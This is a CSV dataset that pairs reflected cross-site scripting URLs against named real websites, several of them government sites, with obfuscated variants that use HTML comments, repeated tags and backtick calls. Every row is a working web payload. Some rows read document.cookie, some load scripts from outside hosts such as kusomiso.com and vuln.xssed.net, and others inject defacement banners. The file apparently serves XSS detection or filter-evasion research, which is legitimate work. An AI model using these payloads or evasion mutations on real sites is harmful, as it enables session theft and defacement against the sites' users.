Payloads,Original
http://www.xixixi.jp/xixixi2/j/pwd_send.php?mno=&amp;scd=1&amp;sk=1&amp;idp=&amp;qs=&amp;nonlogin=1%22%3e'%3e%3cscript%3<br>ealert`'x'`%3c<!--Comment-->/script%3e%3cscript%3<br>ealert`'x'`%3c<!--Comment-->/script%3e%3cscript%3<br>ealert`'x'`%3c<!--Comment-->/script%3e%3cscript%3<br>ealert`'x'`%3c<!--Comment-->/script%3e%3cscript%3<br>ealert`'x'`%3c<!--Comment-->/script%3e%3cscript%3<br>ealert`'x'`%3c<!--Comment-->/script%3e%3cscript%3<br>ealert`'x'`%3c<!--Comment-->/script%3e%3cscript%3<br>ealert`'x'`%3c<!--Comment-->/script%3e,http://www.xixixi.jp/xixixi2/j/pwd_send.php?mno=&amp;scd=1&amp;sk=1&amp;idp=&amp;qs=&amp;nonlogin=1%22%3e'%3e%3cscript%3<br>ealert('x')%3c/script%3e
http://xray.bmc.uu.se/markh/php/xtalscreens.php?func=lookup&amp;screen_name=&lt;<!--Comment-->/textarea&gt;&lt;/textarea<!--Comment-->&gt;'&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`<br<!--Comment-->><br<!--Comment-->>location`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,http://xray.bmc.uu.se/markh/php/xtalscreens.php?func=lookup&amp;screen_name=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(<br>location)&lt;/script&gt;
http://dizzel.pmang.com/index.nwz?mkey=5&amp;skey=%22%3e%3cscript%20%0a%0d<!--Comment-->%3e%3c<!--Comment-->script%20%0a%0d%3ealert`%22xss%20by%20d3vbit3<br<!--Comment-->><br<!--Comment-->>%22`;%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e,http://dizzel.pmang.com/index.nwz?mkey=5&amp;skey=%22%3e%3cscript%20%0a%0d%3ealert(%22xss%20by%20d3vbit3<br>%22);%3c/script%3e
http://www.specialtyliving.com/products/balmoral-copper-2-tier-solar-fountain?idcategory=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;a<br<!--Comment-->><br<!--Comment-->>lert`&quot;maxwel&quot;`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;,http://www.specialtyliving.com/products/balmoral-copper-2-tier-solar-fountain?idcategory=&quot;&gt;&lt;script&gt;a<br>lert(&quot;maxwel&quot;)&lt;/script&gt;
http://www.mastertop100.com/topsites/periodic.php?type=mensile&amp;cg=%27%3e%22%3e%3c<!--Comment-->script%2fsrc%3dhttp<br>%3a%2f%2fkusomiso%2ecom%2fx%2ejs%3e%3cscript%2fsrc%3dhttp<br<!--Comment-->>%3a%2f%2fkusomiso%2ecom%2fx%2ejs%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,http://www.mastertop100.com/topsites/periodic.php?type=mensile&amp;cg=%27%3e%22%3e%3cscript%2fsrc%3dhttp<br>%3a%2f%2fkusomiso%2ecom%2fx%2ejs%3e%3c%2fscript%3e
http://www.freestreet.it/?cityid=-23&amp;lang=it&amp;search=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%2fscr34m%2f%29%3b%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e%3c<!--Comment-->%<br>2fscript%3e&amp;subcatid=0&amp;view=ads&amp;catid=3,http://www.freestreet.it/?cityid=-23&amp;lang=it&amp;search=%22%3e%3cscript%3ealert%28%2fscr34m%2f%29%3b%3c%<br>2fscript%3e&amp;subcatid=0&amp;view=ads&amp;catid=3
http://www.ericlawrence.com/eric/post/comment.asp?date=%27%22%3e%3cimg%20src=%22http://www.mujeresti<br>c.com/wp-content/uploads/muerte-azul.gif%22%20/<!--Comment-->%3e%3cimg%20src=%22http://www.mujeresti<br>c.com/wp-content/uploads/muerte-azul.gif%22%20/<!--Comment-->%3e%3cimg%20src=%22http://www.mujeresti<br<!--Comment-->>c.com/wp-content/uploads/muerte-azul.gif%22%20/%3e%3cimg%20src=%22http://www.mujeresti<br<!--Comment-->>c.com/wp-content/uploads/muerte-azul.gif%22%20/%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e,http://www.ericlawrence.com/eric/post/comment.asp?date=%27%22%3e%3cimg%20src=%22http://www.mujeresti<br>c.com/wp-content/uploads/muerte-azul.gif%22%20/%3e%3cscript%3e
http://www.hotbot.com/?nil_suggest=btn&amp;ps=&amp;loc=searchbox&amp;tab=web&amp;mode=search&amp;currprov=ask&amp;query=%3c%<br<!--Comment-->>2ftitle%3e%3c%<br<!--Comment-->>2ftitle%3e%3c%<br<!--Comment-->>2ftitle%3e%3c%<br<!--Comment-->>2ftitle%3e%3c%<br>2ftitle<!--Comment-->%3e%3c%<br>2ftitle<!--Comment-->%3e%3c%<br>2ftitle<!--Comment-->%3e%3c%<br>2ftitle<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%27xss+from+sshjason%27%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,http://www.hotbot.com/?nil_suggest=btn&amp;ps=&amp;loc=searchbox&amp;tab=web&amp;mode=search&amp;currprov=ask&amp;query=%3c%<br>2ftitle%3e%3cscript%3ealert%28%27xss+from+sshjason%27%29%3c%2fscript%3e
http://www.free-host-directory.com/signinform.php?msg=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;mar<br<!--Comment-->>quee&gt;&lt;mar<br>quee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;backdoor&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;,http://www.free-host-directory.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;
http://www.qweb.es/cert-www.corporinoquia.gov.co.html%27%22%3e%3c<!--Comment-->/title%3e%3c/title<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`1337`%3c<br<!--Comment-->>/script%3e%3c<!--Comment--><br>/script%3e%3e%3c<!--Comment-->marquee%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->h1%3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/marquee%3e%3c/marquee<!--Comment-->%3e,http://www.qweb.es/cert-www.corporinoquia.gov.co.html%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e
http://www.audits.performance-publique.gouv.fr/performance/audit_ci.php?m=&amp;p=&amp;v=&amp;t=&amp;g=0&amp;rec=%22%3e%2<br<!--Comment-->><br<!--Comment-->>7%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js<!--Comment-->%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js<!--Comment-->%3e%3c%2fscript%3<br<!--Comment-->><br<!--Comment-->>e,http://www.audits.performance-publique.gouv.fr/performance/audit_ci.php?m=&amp;p=&amp;v=&amp;t=&amp;g=0&amp;rec=%22%3e%2<br>7%3e%3cscript+src%3dhttp%3a%2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3<br>e
http://supernaturalfanwiki.wetpaint.com/account/%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22xss%20by%20azat%22`%3c%2fscr<br>ipt<!--Comment-->%3e%3c%2fscr<br>ipt<!--Comment-->%3e%3c%2fscr<br>ipt<!--Comment-->%3e%3c%2fscr<br>ipt<!--Comment-->%3e,http://supernaturalfanwiki.wetpaint.com/account/%3e%3cscript%3ealert(%22xss%20by%20azat%22)%3c%2fscr<br>ipt%3e
http://www.diadiaeducacao.pr.gov.br/portals/frm_login.php?acesso=&amp;origem=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.co<br<!--Comment-->><br<!--Comment-->>okie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,http://www.diadiaeducacao.pr.gov.br/portals/frm_login.php?acesso=&amp;origem=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;
http://benq.pt/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`'xss'`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;by+nar<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>coticxs&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,http://benq.pt/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;
"http://echl.leaguestat.com/stats/statdisplay.php?type=&quot;&gt;%22%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ealert`string.fromcharcode`<br<!--Comment-->><br<!--Comment-->>115,101,121,109,101,110``%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e","http://echl.leaguestat.com/stats/statdisplay.php?type=&quot;&gt;%22%3e%3cscript%3ealert(string.fromcharcode(<br>115,101,121,109,101,110))%3c/script%3e"
http://www.mandrivalinux.eu/downloads.php?do=cat&amp;id=14%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22critia!!%20vbulleti<br<!--Comment-->><br<!--Comment-->>n%20xssed%20\ncookie%20editor%22`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.mandrivalinux.eu/downloads.php?do=cat&amp;id=14%22%3e%3cscript%3ealert(%22critia!!%20vbulleti<br>n%20xssed%20\ncookie%20editor%22)%3c/script%3e
http://auctions.nba.com/cgi-bin/ncommerce3/execmacro/getpswd.d2w/report?wl=151&amp;url=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`d<br<!--Comment-->><br<!--Comment-->>ocument.cookie`&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,http://auctions.nba.com/cgi-bin/ncommerce3/execmacro/getpswd.d2w/report?wl=151&amp;url=&quot;&gt;&lt;script&gt;alert(d<br>ocument.cookie)&lt;/script&gt;
http://lzelaa.lzsme.gov.cn/new-search.php?strkey=%22%27%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%27xss%27`;alert`documen<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>t.cookie`%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e,http://lzelaa.lzsme.gov.cn/new-search.php?strkey=%22%27%3e%3cscript%3ealert(%27xss%27);alert(documen<br>t.cookie)%3c%2fscript%3e
http://oroscopo.seidimoda.repubblica.it/zodiaco.php?segno=%22%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28doc<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>ument.cookie%29%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c<!--Comment-->/marquee%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,http://oroscopo.seidimoda.repubblica.it/zodiaco.php?segno=%22%3e%3cmarquee%3e%3cscript%3ealert%28doc<br>ument.cookie%29%3c/script%3e%3c/marquee%3e
http://help.travian3.pl/index.php?type=faq&amp;mod=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28%2fxss+by+redtuning%2f%29%3<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>b%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,http://help.travian3.pl/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3<br>b%3c%2fscript%3e
http://www.kupoprodaja.com/webcards/upload/tools/calendar.php?month=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`<br<!--Comment-->><br<!--Comment-->>&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;,http://www.kupoprodaja.com/webcards/upload/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)<br>&lt;/script&gt;
http://www.btwsa.com.ar/sitepags/xprocesar.asp?criterio=cadena&amp;string=%22%3e%3c<!--Comment-->script+src%3dhttp%3a%<br>2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3c<!--Comment-->script+src%3dhttp%3a%<br>2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3cscript+src%3dhttp%3a%<br>2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js<!--Comment-->%3e%3cscript+src%3dhttp%3a%<br>2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e&amp;x=0&amp;y=0,http://www.btwsa.com.ar/sitepags/xprocesar.asp?criterio=cadena&amp;string=%22%3e%3cscript+src%3dhttp%3a%<br>2f%2fvuln.xssed.net%2fthirdparty%2fscripts%2fckers.org.js%3e%3c%2fscript%3e&amp;x=0&amp;y=0
http://www.silicon.com/search/?q=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%28document%2ecookie%29%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e&amp;c=&amp;ss<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>=&amp;submit.x=0&amp;submit.y=0,http://www.silicon.com/search/?q=%22%3e%3cscript%3ealert%28document%2ecookie%29%3c%2fscript%3e&amp;c=&amp;ss<br>=&amp;submit.x=0&amp;submit.y=0
http://help.travian.fi/index.php?type=faq&amp;mod=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%2fxss+by+redtuning%2f%29%3b<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,http://help.travian.fi/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b<br>%3c%2fscript%3e
http://www.ebrular.com/galeri/igallery.asp?d=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;<!--Comment-->marquee&gt;&lt;marquee<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;<br<!--Comment-->><br<!--Comment-->>by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;/marquee<!--Comment-->&gt;,http://www.ebrular.com/galeri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;
http://www.kanald.com.tr/uyelikdiger2/bilgi.asp?strmes=&lt;script<!--Comment-->&gt;&lt;<!--Comment-->script&gt;alert`&quot;scriptorium`turkey`<br<!--Comment-->><br<!--Comment-->>hackhaber.com&quot;`&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;,http://www.kanald.com.tr/uyelikdiger2/bilgi.asp?strmes=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;
http://www.ofsted.gov.uk/content/advancedsearch/summary?searchtext='&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`'www.xssed.com'`<br<!--Comment-->><br<!--Comment-->>&lt;/script<!--Comment-->&gt;&lt;<!--Comment-->/script&gt;,http://www.ofsted.gov.uk/content/advancedsearch/summary?searchtext='&quot;&gt;&lt;script&gt;alert('www.xssed.com')<br>&lt;/script&gt;
